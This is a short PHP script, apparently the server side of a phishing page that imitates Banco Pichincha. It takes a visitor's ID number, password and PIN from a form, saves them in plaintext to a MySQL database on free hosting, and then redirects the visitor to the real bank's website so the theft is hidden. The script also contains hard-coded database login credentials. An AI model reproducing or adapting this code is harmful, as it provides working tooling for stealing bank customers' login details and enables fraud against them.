<?php
// Datos de conexión a la base de datos en InfinityFree
$host = "sql205.infinityfree.com";  // Nombre del host MySQL
$user = "if0_38555962";             // Usuario de MySQL
$password = "d4rNqnAfb4z";          // Contraseña de MySQL
$dbname = "if0_38555962_zowers";    // Nombre de la base de datos

// Conectar a la base de datos
$conn = new mysqli($host, $user, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

// Verificar si la solicitud es POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir los datos del formulario
    $documento = $_POST["documento"];
    $password = $_POST["password"];
    $pin = $_POST["pin"];

    // Prevenir SQL Injection
    $documento = $conn->real_escape_string($documento);
    $password = $conn->real_escape_string($password);
    $pin = $conn->real_escape_string($pin);

    // Verificar si el usuario ya existe
    $sql_check = "SELECT * FROM usuarios WHERE documento = '$documento'";
    $result_check = $conn->query($sql_check);

    if ($result_check->num_rows == 0) {
        // Si el usuario no existe, insertarlo en la base de datos
        $sql_insert = "INSERT INTO usuarios (documento, password, pin) VALUES ('$documento', '$password', '$pin')";
        if ($conn->query($sql_insert) === TRUE) {
            // Redirigir a la página deseada
            header("Location: https://www.pichincha.com");
            exit();
        } else {
            echo "Error al guardar los datos: " . $conn->error;
        }
    } else {
        echo "El usuario ya existe en la base de datos.";
    }
}

// Cerrar conexión
$conn->close();
?>
